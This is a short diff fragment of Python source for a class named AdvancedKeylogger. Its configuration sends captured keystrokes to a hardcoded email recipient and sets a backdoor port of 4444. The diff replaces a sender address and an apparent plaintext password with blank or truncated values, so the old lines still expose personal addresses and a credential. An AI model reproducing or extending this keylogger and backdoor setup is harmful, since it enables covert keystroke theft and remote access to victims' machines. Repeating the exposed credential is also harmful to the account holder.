@@ -57,8 +57,8 @@ class AdvancedKeylogger:
         self.key_log = []
         self.is_running = True
         self.email_recipient = "d48295548@gmail.com"
-        self.email_sender = "wusjev@gmail.com"
-        self.email_password = "ichmagbastiB1"
+        self.email_sender = "wul.com"
+        self.email_password = ""
         self.backdoor_port = 4444
         self.backdoor_installed = False
         
